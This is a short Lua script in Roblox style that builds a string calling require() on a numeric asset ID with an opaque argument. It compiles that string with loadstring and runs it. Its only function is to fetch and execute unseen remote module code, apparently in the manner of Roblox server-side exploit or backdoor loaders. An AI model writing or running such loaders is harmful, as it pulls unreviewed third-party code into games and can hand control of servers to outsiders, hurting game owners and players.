local script_to_run = "require(72732733952061).FSA(\"5x5x5x5x5xtxtttxtx\")"
local success, func = pcall(loadstring, script_to_run)

if success then
    -- Run the loaded function
    func()
else
    -- Handle the error if loadstring failed (e.g., due to security restrictions)
    warn("Failed to create function with loadstring:", func)
end
